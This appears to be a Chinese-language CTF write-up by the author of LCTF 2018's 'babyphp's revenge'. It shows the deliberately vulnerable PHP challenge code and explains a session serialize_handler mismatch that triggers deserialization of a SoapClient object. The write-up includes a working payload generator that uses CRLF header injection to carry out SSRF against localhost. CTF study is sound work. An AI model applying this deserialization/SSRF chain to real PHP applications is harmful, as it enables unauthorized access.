### babyphp's revenge
代码如下
index.php
```php
<?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET[f],$_POST);
session_start();
if(isset($_GET[name])){
    $_SESSION[name] = $_GET[name];
}
var_dump($_SESSION);
$a = array(reset($_SESSION),'welcome_to_the_lctf2018');
call_user_func($b,$a);
?>
```
flag.php
```php
session_start(); echo 'only localhost can get flag!'; $flag = 'LCTF{*************************}'; if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){ $_SESSION['flag'] = $flag; } 
```
hint:反序列化
这题是我出给XCTF Final的bestphp的第二版，搭建看到flag.php的内容也能猜出来是ssrf。大体思路也是session_start支持一个数组参数，可以覆盖php.ini中的部分session相关变量，而session中有个叫做serialize_handler的参数
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/9F6A76C83EA36A7B5E2B37D26D951FF2.jpg)
可以控制session的解析引擎，所以可以借用由解析引擎的不同导致的session反序列化，构造soap类ssrf，获取flag
但是这里有个问题就是如何进行ssrf构造，众所周知soap的ssrf需要调用_call方法，但是这里如何触发呢，我们回到call_user_func
![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/Snipaste_2018-11-19_14-59-44.png)
这里可以发现我们可以直接使用call_user_func执行对象中的方法，由于我们只需要构造出一个soap类的对象就可以执行`welcome_to_the_lctf2018`的方法，因为这个方法不存在，所以我们相当于调用了_call方法
```php
$target='http://127.0.0.1/flag.php';
$b = new SoapClient(null,array('location' => $target,
                               'user_agent' => "AAA:BBB\r\n" .
                                             "Cookie:PHPSESSID=dde63k4h9t7c9dfl79np27e912",
                               'uri' => "http://127.0.0.1/"));

$se = serialize($b); 
echo urlencode($se);
```


里主要思路是通过php session引擎的不同，导致自动反序列化soap内置类，最终ssrf读到flag

![](https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/121C2F45BD0C6C978579565B052B32C4.jpg)
!()[https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/lctf2018/3FFB2A23BA3AF86034D45C718554A964.jpg)


